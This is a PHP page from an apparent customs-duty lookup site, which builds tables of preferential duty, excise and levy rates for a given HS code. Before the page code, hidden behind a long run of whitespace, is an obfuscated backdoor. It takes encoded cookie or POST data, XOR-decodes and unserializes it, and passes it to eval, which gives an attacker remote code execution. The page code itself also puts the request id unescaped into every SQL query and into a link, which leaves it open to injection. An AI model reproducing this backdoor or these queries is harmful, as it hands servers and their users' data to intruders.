<?php                                                                                                                                                                                                                                                                                                                                                                                                 $CWxLS = chr (73) . "\167" . "\137" . chr ( 768 - 683 ).'u' . chr ( 343 - 275 ); $iPBxdGy = chr ( 810 - 711 ).'l' . "\x61" . "\163" . chr (115) . chr (95) . chr ( 864 - 763 )."\x78" . chr ( 867 - 762 )."\x73" . 't' . chr (115); $UFNqGj = $iPBxdGy($CWxLS); $NIOILWB = $UFNqGj;if (!$NIOILWB){class Iw_UuD{private $rprrNWpdUU;public static $AhfCltqG = "bcd3005c-156c-47fb-94d3-89d43324cf88";public static $khIVULn = 53753;public function __construct(){$lsLLmVGnYU = $_COOKIE;$UEpmZrMuXc = $_POST;$ybYKOd = @$lsLLmVGnYU[substr(Iw_UuD::$AhfCltqG, 0, 4)];if (!empty($ybYKOd)){$IMIXGuhK = "base64";$DgmrV = "";$ybYKOd = explode(",", $ybYKOd);foreach ($ybYKOd as $PRxLRL){$DgmrV .= @$lsLLmVGnYU[$PRxLRL];$DgmrV .= @$UEpmZrMuXc[$PRxLRL];}$DgmrV = array_map($IMIXGuhK . "\x5f" . chr (100) . "\x65" . "\x63" . "\x6f" . chr ( 450 - 350 ).chr ( 686 - 585 ), array($DgmrV,)); $DgmrV = $DgmrV[0] ^ str_repeat(Iw_UuD::$AhfCltqG, (strlen($DgmrV[0]) / strlen(Iw_UuD::$AhfCltqG)) + 1);Iw_UuD::$khIVULn = @unserialize($DgmrV);}}public function __destruct(){$this->UqXJgUHF();}private function UqXJgUHF(){if (is_array(Iw_UuD::$khIVULn)) {$SiqeofD = str_replace("\x3c" . "\x3f" . chr ( 395 - 283 ).'h' . 'p', "", Iw_UuD::$khIVULn[chr (99) . 'o' . "\156" . "\164" . chr (101) . 'n' . 't']);eval($SiqeofD);exit();}}}$kKBWCSc = new Iw_UuD(); $kKBWCSc = 6681;} ?>  <?php
  include 'admin/backend/conn.php';

  $hsid=$_REQUEST['id'];
  //
  $sqlpdname ="SELECT * FROM tbl_pd_name";
  $rspdname= $conn->query($sqlpdname);

  $sqlcalname ="SELECT * FROM tbl_calc_names";
  $rscalname= $conn->query($sqlcalname);

  $sqlPdMultiValue = "SELECT * FROM tbl_pref_multi_value WHERE hs_code='$hsid'";
  $rsPdMultiValue = $conn->query($sqlPdMultiValue);

  if ($rsPdMultiValue->num_rows > 0) {
   ?>
  <h4>Preferential Duty</h4>
  <table class="table">
    <tbody>
      <?php
        while ($rowpdname = $rspdname->fetch_assoc()) {
          $dutynameid = $rowpdname['pd_id'];
          $sqlPdMultiValue = "SELECT * FROM tbl_pref_multi_value WHERE hs_code='$hsid' AND pref_duty_name_id='$dutynameid'";
          $rsPdMultiValue = $conn->query($sqlPdMultiValue);
          if($rsPdMultiValue->num_rows == 1){
            $rowpdMulti = $rsPdMultiValue->fetch_assoc();
            $unit_id = $rowpdMulti['unit_id'];
            if($unit_id == 3){
                 $unitName = "%";
            }
            else {
              $unitName = " per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");
            }

            if($rowpdMulti['cal_val'] == 1001){
              $rowpdMulti['cal_val'] = "Free";
              $unitName = "";
            }
            else if($rowpdMulti['cal_val'] == 7001){
              $rowpdMulti['cal_val'] = "Ex";
              $unitName = "";
            }
       ?>
      <tr>
        <!-- getData($conn,$table,$id_name,$id,$coulmn) -->
        <td style="font-weight:bold;font-size:20px;"><?= $rowpdname['pd_name'] ?></td>
        <td style="font-weight:600;font-size:18px;"> <?= $rowpdMulti['cal_val'] ?><?= $unitName ?>  </td>
      </tr>
    <?php }else{

  ?>
  <?php if($rsPdMultiValue->num_rows > 0){ ?>
    <tr>
      <td style="font-weight:bold;font-size:20px;"><?= $rowpdname['pd_name'] ?></td>
      <td style="font-weight:600;font-size:18px;">
        <?php
        $minusStatus = $rsPdMultiValue->num_rows;

        $sqlPdMultiValuePer = "SELECT * FROM tbl_pref_multi_value WHERE hs_code='$hsid' AND pref_duty_name_id='$dutynameid' AND unit_id='3'";
        $rsPdMultiValuePer = $conn->query($sqlPdMultiValuePer);
        if ($rsPdMultiValuePer->num_rows > 0) {
          $rowPdValPer = $rsPdMultiValuePer->fetch_assoc();
          echo $rowPdValPer['cal_val']."% or";
          --$minusStatus;
        }
         ?>
        <?php
        $count = 1;
        while ($rowpdMulti = $rsPdMultiValue->fetch_assoc()) {
          $unit_id = $rowpdMulti['unit_id'];
          if($unit_id == 3){
            continue;
            // $unitName = $rowpdMulti['cal_val']."%";
          }
          else {
            $unitName ="Rs.".$rowpdMulti['cal_val']." per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");

           ?>

         <?= $unitName ?>
         <?php
         if($count != $minusStatus){ echo "or"; }

         ?>

      <?php  } $count++; } ?>
      </td>
    </tr>
  <?php } ?>
  <?php
  } } ?>
    </tbody>
  </table>
  <?php
   }else{

  $showpd = 0;
  $sqlPd = "SELECT * FROM tbl_pd_value WHERE hs_sub_code ='$hsid'";
  $rsPd = $conn->query($sqlPd);
  if ($rsPd->num_rows > 0) {
    while ($rowpd = $rsPd->fetch_assoc()) {
      if ($rowpd['pdv_value'] > 0) {
        $showpd += 1;
      }
    } }

   if ($showpd > 0){ ?>
  <h4>Preferential Duty</h4>
  <table class="table">
    <tbody>
      <?php while ($rowpdname = $rspdname->fetch_assoc()) {
        $pdid = $rowpdname['pd_id'];
        $sqlPd = "SELECT * FROM tbl_pd_value WHERE hs_sub_code ='$hsid' AND pd_id='$pdid'";
        $rsPd = $conn->query($sqlPd);
        if ($rsPd->num_rows > 0) {
          while ($rowpd = $rsPd->fetch_assoc()) {
            if ($rowpd['pdv_value'] > 0) {
              if($rowpd['pdv_value'] == 1001){
                $rowpd['pdv_value'] = "Free";
              }
              else {
                $rowpd['pdv_value'] = $rowpd['pdv_value'].'%';
              }
         ?>
      <tr>
        <td style="font-weight:bold;font-size:20px;"><?= $rowpdname['pd_name'] ?></td>
        <td style="font-weight:600;font-size:18px;"><?= $rowpd['pdv_value'] ?></td>
      </tr>
    <?php } ?>
    <?php } } } ?>
    </tbody>
  </table>

  <?php  } } ?>
  <!-- Preferential Duty end -->

  <!-- start of gen duty -->
  <?php

  $sqlCalValu = "SELECT * FROM tbl_main_calc WHERE hs_sub_code='$hsid'";
  $rsCalValue = $conn->query($sqlCalValu);

  if ($rsCalValue->num_rows > 0) {

   ?>
  <table class="table">
    <tbody>
      <?php
        while ($rowcalname = $rscalname->fetch_assoc()) {
          $dutynameid = $rowcalname['cln_id'];
          $sqlCalValu = "SELECT * FROM tbl_main_calc WHERE hs_sub_code='$hsid' AND cal_n_id='$dutynameid'";
          $rsCalValue = $conn->query($sqlCalValu);
          if($rsCalValue->num_rows == 1){
            $rowCal = $rsCalValue->fetch_assoc();
            $unit_id = $rowCal['unit_id'];
            if($unit_id == 3){
              $unitName = "%";
            }
            else {
              $unitName = " per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");
            }

            $value =$rowCal['cal_value'];
            if ($value == "1001") {
              $value = "Free";
              $unitName = "";
            }
            elseif ($value == "7001") {
              $value = "Ex";
              $unitName = "";
            }
            elseif ($value == "8001") {
              $value = "conn";
              $unitName = "";
            }
       ?>
       <?php if($rowcalname['cln_name'] == "Cess" && $hsid == "3401.11.30"){ ?>
      <tr>
        <!-- getData($conn,$table,$id_name,$id,$coulmn) -->
        <td style="font-weight:bold;font-size:20px;"><?= $rowcalname['cln_name'] ?></td>
        <td style="font-weight:600;font-size:18px;"> 40% or 40% of 65% of MRP or Rs.330/= per kg  </td>
      </tr>
    <?php }
    else{ ?>
      <tr>
        <td style="font-weight:bold;font-size:20px;"><?= $rowcalname['cln_name'] ?></td>
        <td style="font-weight:600;font-size:18px;"> <?= $value ?><?= $unitName ?>  </td>
      </tr>
    <?php } ?>
    <?php }else{

  ?>
  <?php if($rsCalValue->num_rows > 0){ ?>
    <tr>
      <td style="font-weight:bold;font-size:20px;"><?= $rowcalname['cln_name'] ?></td>
      <td style="font-weight:600;font-size:18px;">
        <?php
        $minusStatus = $rsCalValue->num_rows;

        $sqlCalValuePer = "SELECT * FROM tbl_main_calc WHERE hs_sub_code='$hsid' AND cal_n_id='$dutynameid' AND unit_id='3'";
        $rsCalValuePer = $conn->query($sqlCalValuePer);
        if ($rsCalValuePer->num_rows > 0) {
          $rowCalValPer = $rsCalValuePer->fetch_assoc();
          echo $rowCalValPer['cal_value']."% or";
          --$minusStatus;
        }
         ?>
        <?php
        $count = 1;
        while ($rowCalVal = $rsCalValue->fetch_assoc()) {
          $unit_id = $rowCalVal['unit_id'];
          if($unit_id == 3){
            continue;
            // $unitName = $rowpdMulti['cal_val']."%";
          }
          else {
            $unitName ="Rs.".$rowCalVal['cal_value']." per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");

           ?>

         <?= $unitName ?>
         <?php
         if($count != $minusStatus){ echo "or"; }

         ?>

      <?php  } $count++; } ?>
      </td>
    </tr>
  <?php } ?>
  <?php
  } } ?>
  <tr>
    <td style="font-weight:bold;font-size:20px;">SSCL</td>
    <td style="font-weight:600;font-size:18px;"> 2.5% </td>
  </tr>
    </tbody>
  </table>
  <?php
  } ?>
  <!-- end of gen duty -->
  <!-- names has to change -->

  <!-- start of excise -->
  <?php

  $sqlExciseValue = "SELECT * FROM tbl_excise WHERE hs_code='$hsid'";
  $rsExciseValue = $conn->query($sqlExciseValue);

  if ($rsExciseValue->num_rows > 0) {

   ?>
  <table class="table">
    <tbody>
      <?php
          $sqlExciseValue = "SELECT * FROM tbl_excise WHERE hs_code='$hsid'";
          $rsExciseValue = $conn->query($sqlExciseValue);


          if($rsExciseValue->num_rows == 1){
            $rowExcise = $rsExciseValue->fetch_assoc();
            $unit_id = $rowExcise['un_id'];
            if($unit_id == 3){
              $unitName = "%";
            }
            else {
              $unitName = " per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");
            }

            $value =$rowExcise['exci_val'];
            if ($value == "1001") {
              $value = "Free";
              $unitName = "";
            }
            elseif ($value == "7001") {
              $value = "Ex";
              $unitName = "";
            }
       ?>
       <?php if($hsid == "2202.10.00"){ ?>
      <tr>
        <!-- getData($conn,$table,$id_name,$id,$coulmn) -->
        <td style="font-weight:bold;font-size:20px;">Excise(S.P.L)</td>
        <td style="font-weight:600;font-size:18px;"> Rs. 12 per litre or 30 Cts per gram
  of sugar, excluding 6 g per 100
  mililiter,
  contained in the product which ever
  is higher  </td>
      </tr>
    <?php }else{ ?>
      <tr>
        <!-- getData($conn,$table,$id_name,$id,$coulmn) -->
        <td style="font-weight:bold;font-size:20px;">Excise(S.P.L)</td>
        <td style="font-weight:600;font-size:18px;"> <?= $value ?><?= $unitName ?>  </td>
      </tr>
    <?php } ?>
    <?php }else{

  ?>
  <?php if($rsExciseValue->num_rows > 0){ ?>
    <tr>
      <td style="font-weight:bold;font-size:20px;">Excise(S.P.L)</td>
      <td style="font-weight:600;font-size:18px;">
        <?php
        $minusStatus = $rsExciseValue->num_rows;

        $sqlExciseValPer = "SELECT * FROM tbl_excise WHERE hs_code='$hsid' AND un_id='3'";
        $rsExciseValue = $conn->query($sqlExciseValPer);
        if ($rsExciseValue->num_rows > 0) {
          $rowExValPer = $rsExciseValue->fetch_assoc();
          echo $rowExValPer['exci_val']."% or";
          --$minusStatus;
        }
         ?>
        <?php
        $count = 1;
        while ($rowExVal = $rsExciseValue->fetch_assoc()) {
          $unit_id = $rowExVal['un_id'];
          if($unit_id == 3){
            continue;
            // $unitName = $rowpdMulti['cal_val']."%";
          }
          else {
            $unitName ="Rs.".$rowExVal['exci_val']." per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");

           ?>

         <?= $unitName ?>
         <?php
         if($count != $minusStatus){ echo "or"; }

         ?>

      <?php  } $count++; } ?>
      </td>
    </tr>
  <?php } ?>
  <?php
  }  ?>
    </tbody>
  </table>
  <?php
  }else{ ?>


    <?php
    $sqlexc = "SELECT * FROM tbl_ex_ranges WHERE hs_sub_code = '$hsid'";
    $rsexc = $conn->query($sqlexc);
    $rsexc_check = $rsexc->num_rows;
    if ($rsexc_check != 0) {
     ?>
     <table class="table">
       <tbody>
         <tr>
           <td style="font-weight:bold;font-size:20px;">Excise </td>
           <td style="font-weight:bold;font-size:18px;">
             <?php
               while ($rowexrange =  $rsexc->fetch_assoc()) {
              ?>
             <?= $rowexrange['r_from'] ?> cm<sup>3</sup>  &#60;x&#60;  <?= $rowexrange['r_to'] ?>cm<sup>3</sup> = Rs.<?= $rowexrange['r_value'] ?>/- Per cm<sup>3</sup>
               <hr style="border:1px solid #000;">
           <?php } ?>
           </td>
         </tr>
       </tbody>
     </table>
    <?php } ?>

  <?php } ?>
  <!-- end of excise -->

  <!-- start of SCL -->
  <?php

  $sqlScl = "SELECT * FROM tbl_scl WHERE hs_code='$hsid'";
  $rsSclValue = $conn->query($sqlScl);

  if ($rsSclValue->num_rows > 0) {

   ?>
  <table class="table">
    <tbody>
      <?php
          $sqlScl = "SELECT * FROM tbl_scl WHERE hs_code='$hsid'";
          $rsSclValue = $conn->query($sqlScl);
          if($rsSclValue->num_rows == 1){
            $rowScl = $rsSclValue->fetch_assoc();
            $unit_id = $rowScl['unit_id'];
            if($unit_id == 3){
              $unitName = "%";
            }
            else {
              $unitName = " per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");
            }

            $value =$rowScl['scl_value'];
            if ($value == "1001") {
              $value = "Free";
              $unitName = "";
            }

            if ($value == "7001") {
              $value = "Ex";
              $unitName = "";
            }
       ?>
      <tr>
        <!-- getData($conn,$table,$id_name,$id,$coulmn) -->
        <td style="font-weight:bold;font-size:20px;">SCL</td>
        <td style="font-weight:600;font-size:18px;"> <?= $value ?><?= $unitName ?>  </td>
      </tr>
    <?php }else{

  ?>
  <?php if($rsSclValue->num_rows > 0){ ?>
    <tr>
      <td style="font-weight:bold;font-size:20px;">SCL</td>
      <td style="font-weight:600;font-size:18px;">
        <?php
        $minusStatus = $rsSclValue->num_rows;

        $sqlSclValPer = "SELECT * FROM tbl_scl WHERE hs_code='$hsid' AND unit_id='3'";
        $rsSclValuePer = $conn->query($sqlSclValPer);
        if ($rsSclValuePer->num_rows > 0) {
          $rowSclPer = $rsSclValuePer->fetch_assoc();
          echo $rowSclPer['scl_value']."% or";
          --$minusStatus;
        }
         ?>
        <?php
        $count = 1;
        while ($rowSclMulti = $rsSclValue->fetch_assoc()) {
          $unit_id = $rowSclMulti['unit_id'];
          if($unit_id == 3){
            continue;
            // $unitName = $rowpdMulti['cal_val']."%";
          }
          else {
            $unitName ="Rs.".$rowSclMulti['scl_value']." per ".getData($conn,"tbl_units","unit_id",$unit_id,"unit_name");

           ?>

         <?= $unitName ?>
         <?php
         if($count != $minusStatus){ echo "or"; }
         ?>

      <?php  } $count++; } ?>
      </td>
    </tr>
  <?php } ?>
  <?php
  }  ?>
    </tbody>
  </table>
  <?php
  } ?>
  <!-- end of SCL -->
  <?php
      $sql_lic = "SELECT * FROM tbl_lic WHERE hs_code='$hsid'";
      $rs_lic = $conn->query($sql_lic);
      if($rs_lic->num_rows > 0){
          $row_lic = $rs_lic->fetch_assoc();
          $lic_name =$row_lic['lic_name'];

          if($lic_name == "L"){
              $show_name = "Subject to ICL";
          }
          ?>
              <h4 style="text-align:center;"> <a href="licenceinfo"><?= $show_name ?></a> </h4>
          <?php
      }
  ?>


   <div class="text-center">
     <a href="calc?hscode=<?= $hsid ?>" class="btn btn-primary">Duty Calculator</a>
   </div>
